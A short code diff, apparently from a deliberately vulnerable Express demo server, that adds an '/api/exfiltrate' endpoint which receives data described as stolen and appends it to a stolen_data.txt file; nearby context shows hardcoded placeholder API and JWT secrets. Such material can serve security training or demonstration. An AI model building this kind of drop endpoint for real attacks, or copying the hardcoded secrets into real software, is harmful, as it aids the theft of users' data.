@@ -373,6 +373,36 @@ API_KEY=sk-1234567890abcdef
 JWT_SECRET=my-ultra-secret-jwt-key`);
 });
 
+// 5. DATA EXFILTRATION - Endpoint to receive and save stolen data
+app.post("/api/exfiltrate", (_req, res) => {
+  console.log("[EXPLOIT] Data exfiltration received");
+  
+  const stolenData = _req.body;
+  const timestamp = new Date().toISOString();
+  const logEntry = `
+[${timestamp}]
+Type: ${stolenData.type}
+Data: ${JSON.stringify(stolenData.data, null, 2)}
+-------------------------------------------
+`;
+
+  const logFile = path.join(__dirname, "stolen_data.txt");
+  
+  try {
+    fs.appendFileSync(logFile, logEntry);
+    console.log(`[!] Stolen ${stolenData.type} saved to stolen_data.txt`);
+    
+    res.status(200).json({
+      success: true,
+      message: "Data received and saved",
+      file: "stolen_data.txt"
+    });
+  } catch (err: any) {
+    console.error(`[-] Error saving stolen data: ${err.message}`);
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // ============================================================================
 // END VULNERABLE ENDPOINTS
 // ============================================================================
